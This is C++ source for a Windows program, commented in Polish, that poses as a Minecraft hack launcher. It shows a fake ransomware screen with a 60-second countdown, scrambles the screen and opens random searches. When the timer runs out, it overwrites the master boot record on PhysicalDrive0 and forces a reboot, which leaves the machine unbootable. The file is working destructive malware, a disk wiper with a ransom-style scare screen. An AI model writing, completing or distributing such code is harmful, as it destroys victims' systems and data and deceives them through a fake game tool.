#include <windows.h> // Podstawowe funkcje Windows
#include <iostream>  // Do wypisywania rzeczy w konsoli (choć ukrywamy ją)
#include <fstream>   // Do tworzenia pliku Notatnika
#include <string>    // Do pracy z tekstem
#include <thread>    // Do robienia kilku rzeczy na raz (wątki)
#include <chrono>    // Do odliczania czasu
#include <ctime>     // Do losowania liczb (rand)

// Ta zmienna mówi, czy program ma się zatrzymać (gdy wpiszemy klucz)
bool czy_odblokowany = false;

// --- FUNKCJA 1: CHAOS WIZUALNY (TUNEL I BŁĘDY) ---
void RysujChaos() {
    HDC hdc = GetDC(NULL); // Pobiera dostęp do ekranu
    int szerokosc_ekranu = GetSystemMetrics(0); // Szerokość
    int wysokosc_ekranu = GetSystemMetrics(1); // Wysokość

    while (!czy_odblokowany) { // Dopóki nie wpisano klucza:
        // Tworzy efekt "tunelu" - przesuwa obraz
        StretchBlt(hdc, 10, 10, szerokosc_ekranu - 20, wysokosc_ekranu - 20, 
                   hdc, 0, 0, szerokosc_ekranu, wysokosc_ekranu, SRCCOPY);
        
        // Czasem rysuje losową ikonę błędu
        if (rand() % 15 == 1) { // 1 na 15 razy
            DrawIcon(hdc, rand() % szerokosc_ekranu, rand() % wysokosc_ekranu, 
                     LoadIcon(NULL, IDI_ERROR)); // Rysuje ikonę "X"
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Czekaj chwilę
    }
}

// --- FUNKCJA 2: MYSZKA I STRONY WWW ---
void MyszkujISurfuj() {
    POINT pozycja_myszy; // Gdzie jest myszka
    while (!czy_odblokowany) { // Dopóki nie wpisano klucza:
        GetCursorPos(&pozycja_myszy); // Pobierz pozycję myszki
        // Rysuje ikonę ostrzeżenia pod myszką
        DrawIcon(GetDC(NULL), pozycja_myszy.x, pozycja_myszy.y, 
                 LoadIcon(NULL, IDI_WARNING)); // Rysuje ikonę "!"
        
        // Czasem otwiera losową stronę w przeglądarce
        if (rand() % 400 == 1) { // 1 na 400 razy
            const char* strony[] = { // Lista stron
                "https://www.google.com/search?q=jak+naprawic+komputer",
                "https://www.google.com/search?q=czy+wirusy+niszcza+komputer",
                "https://www.google.com/search?q=ratunku+moj+komputer+sie+psuje"
            };
            // Otwiera domyślną przeglądarkę
            ShellExecuteA(NULL, "open", strony[rand() % 3], NULL, NULL, SW_SHOWNORMAL);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(15)); // Czekaj chwilę
    }
}

// --- FUNKCJA 3: NISZCZENIE MBR I ANIMACJA PO RESTARCIE ---
void ZniszczMBR() {
    // To jest bardzo specjalny kod (asembler), który po restarcie komputera
    // uruchomi małą animację zamiast systemu operacyjnego.
    // Pełna animacja Nyan Cata jest zbyt duża, więc to jest jej uproszczona wersja.
    unsigned char kod_animacji_mbr[512] = {
        0xb8, 0x13, 0x00, 0xcd, 0x10, 0xbe, 0xac, 0x7c, 0xb0, 0x61, 0xba, 0xad, 0x03, 0xee, 0xb0, 0x01,
        0xba, 0xda, 0x03, 0xec, 0xa8, 0x08, 0x75, 0xfb, 0xec, 0xa8, 0x08, 0x74, 0xfb, 0x04, 0x05, 0x3c,
        0x13, 0x72, 0xe5, 0xb0, 0x61, 0xee, 0xeb, 0xe1
    };
    kod_animacji_mbr[510] = 0x55; // Ważny podpis dla BIOS-u
    kod_animacji_mbr[511] = 0xAA; // Ważny podpis dla BIOS-u

    DWORD zapisane_bajty;
    // Otwiera dysk twardy numer 0 (pierwszy dysk)
    HANDLE hDysk = CreateFileA("\\\\.\\PhysicalDrive0", 
                               GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                               NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDysk == INVALID_HANDLE_VALUE) { // Jeśli nie udało się otworzyć dysku
        MessageBoxA(NULL, "Blad: Nie mozna dostac sie do dysku! Uruchom jako Administrator!", 
                    "BLAD PRZY NISZCZENIU", MB_OK | MB_ICONERROR);
        return; // Koniec funkcji
    }
    
    WriteFile(hDysk, kod_animacji_mbr, 512, &zapisane_bajty, NULL); // Zapisz kod
    CloseHandle(hDysk); // Zamknij dostęp do dysku
    
    // Wymusza restart komputera
    system("shutdown /r /t 0 /f"); 
}

// --- FUNKCJA 4: OKNO RANSOMWARE (Z CZASZKĄ I LICZNIKIEM) ---
LRESULT CALLBACK OknoRansomware(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND pole_tekstowe; // Pole do wpisania klucza
    if (uMsg == WM_CREATE) { // Gdy okno się tworzy:
        CreateWindow("static", "!!! TWOJE PLIKI ZOSTALY ZASZYFROWANE !!!", 
                     WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 10, 500, 20, hwnd, NULL, NULL, NULL);
        CreateWindow("static", "      XXXXX\n     X     X\n    X  O O  X\n    X   ^   X\n     X --- X\n      XXXXX", 
                     WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 40, 500, 100, hwnd, NULL, NULL, NULL);
        CreateWindow("static", "WPISZ KLUCZ: 1234 (MASZ 60 SEKUND)", 
                     WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 150, 500, 20, hwnd, NULL, NULL, NULL);
        
        pole_tekstowe = CreateWindow("edit", "", 
                                     WS_CHILD | WS_VISIBLE | WS_BORDER, 150, 180, 100, 25, hwnd, NULL, NULL, NULL);
        CreateWindow("button", "ODSZYFRUJ", 
                     WS_CHILD | WS_VISIBLE, 260, 180, 80, 25, hwnd, (HMENU)2, NULL, NULL);
    }
    if (uMsg == WM_COMMAND && LOWORD(wParam) == 2) { // Gdy klikniesz przycisk "ODSZYFRUJ":
        char bufor[10]; GetWindowText(pole_tekstowe, bufor, 10); // Pobierz tekst z pola
        if (std::string(bufor) == "1234") { // Jeśli klucz poprawny
            czy_odblokowany = true; // Zatrzymuje programy w tle
            MessageBoxA(NULL, "System naprawiony! Zostaniesz ocalony.", "SUKCES", MB_OK); 
            exit(0); // Zamknij program
        } else { // Klucz błędny
            MessageBoxA(hwnd, "BLEDNY KLUCZ!", "BLAD", MB_OK | MB_ICONERROR);
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// --- FUNKCJA 5: START WSZYSTKIEGO PO KLIKNIĘCIU "RUN!" ---
void RozpocznijChaos() {
    // 1. Ostatnie ostrzeżenie w Notatniku
    std::ofstream plik_info("OSTRZEZENIE.txt");
    plik_info << "Zycze powodzenia z naprawianiem komputera...\n\n";
    plik_info << "Wlasnie uruchomiles proces, ktorego nie da sie cofnac.\n";
    plik_info << "Twoje pliki sa szyfrowane, a sektor startowy wlasnie ginie.\n";
    plik_info << "Masz 60 sekund. Zegar tyka.\n\n";
    plik_info << "Nie zrestartuj komputera! To pogorszy sprawe!\n\n";
    plik_info << "Powodzenia.";
    plik_info.close();
    system("start notepad.exe OSTRZEZENIE.txt"); // Otwórz Notatnik
    std::this_thread::sleep_for(std::chrono::seconds(2)); // Daj czas na przeczytanie

    // 2. Uruchomienie wątków (efektów) w tle
    std::thread(RysujChaos).detach(); // Startuje rysowanie tunelu
    std::thread(MyszkujISurfuj).detach(); // Startuje myszkę i strony

    // 3. Tworzenie i wyświetlanie okna Ransomware
    WNDCLASS wc = {0};
    wc.lpfnWndProc = OknoRansomware; wc.hInstance = GetModuleHandle(NULL);
    wc.hbrBackground = CreateSolidBrush(RGB(170, 0, 0)); // Czerwone tło
    wc.lpszClassName = "OknoZagrozenia";
    RegisterClass(&wc);
    HWND okno_rans = CreateWindowEx(WS_EX_TOPMOST, "OknoZagrozenia", "KRYTYCZNY BLAD SYSTEMU", 
                                    WS_OVERLAPPEDWINDOW | WS_VISIBLE, 400, 200, 500, 300, 
                                    NULL, NULL, NULL, NULL);

    // 4. Licznik czasu (timer)
    for (int i = 60; i >= 0; i--) {
        if (czy_odblokowany) return; // Jeśli wpisano klucz, wyjdź
        std::string tekst_czasu = "POZOSTALY CZAS: " + std::to_string(i) + "s";
        SetWindowText(okno_rans, tekst_czasu.c_str()); // Aktualizuj tekst w oknie
        std::this_thread::sleep_for(std::chrono::seconds(1)); // Czekaj 1 sekundę
    }
    // Jeśli czas minął i nie odblokowano:
    if (!czy_odblokowany) ZniszczMBR(); 
}

// --- FUNKCJA 6: POCZĄTKOWE OKNO Z PRZYCISKIEM "RUN!" ---
LRESULT CALLBACK OknoStartowe(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_COMMAND && LOWORD(wParam) == 1) { // Jeśli kliknięto przycisk z ID = 1
        DestroyWindow(hwnd); // Ukryj to okno
        RozpocznijChaos(); // Rozpocznij całą sekwencję chaosu
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// --- FUNKCJA GŁÓWNA (main) ---
int main() {
    srand(time(NULL)); // Inicjuje losowanie liczb
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Ukryj czarną konsolę

    // Trzy okna z ostrzeżeniami
    if (MessageBoxA(NULL, "Czy chcesz uruchomic 'Minecraft_Super_Hack.exe'?", "OSTRZEZENIE 1/3", MB_YESNO | MB_ICONWARNING) != IDYES) return 0;
    if (MessageBoxA(NULL, "Program nie posiada cyfrowego podpisu. Kontynuowac?", "OSTRZEZENIE 2/3", MB_YESNO | MB_ICONERROR) != IDYES) return 0;
    if (MessageBoxA(NULL, "OSTATNIE OSTRZEZENIE! TO ZNISZCZY SYSTEM!", "OSTRZEZENIE 3/3", MB_YESNO | MB_ICONSTOP) != IDYES) return 0;

    // Tworzenie małego okna z przyciskiem "Run!"
    WNDCLASS klasa_okna_start = {0};
    klasa_okna_start.lpfnWndProc = OknoStartowe; klasa_okna_start.hInstance = GetModuleHandle(NULL);
    klasa_okna_start.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); klasa_okna_start.lpszClassName = "OknoStart";
    RegisterClass(&klasa_okna_start);
    HWND uchwyt_okna_start = CreateWindow("OknoStart", "Launcher Gry", 
                                         WS_OVERLAPPEDWINDOW | WS_VISIBLE, 500, 300, 300, 150, 
                                         NULL, NULL, NULL, NULL);
    CreateWindow("button", "Run!", 
                 WS_CHILD | WS_VISIBLE, 100, 40, 80, 40, uchwyt_okna_start, (HMENU)1, NULL, NULL);

    // Pętla obsługi zdarzeń Windows (czeka na kliknięcia, itp.)
    MSG wiadomosc; 
    while (GetMessage(&wiadomosc, NULL, 0, 0)) { 
        TranslateMessage(&wiadomosc); 
        DispatchMessage(&wiadomosc); 
    }
    return 0;
}
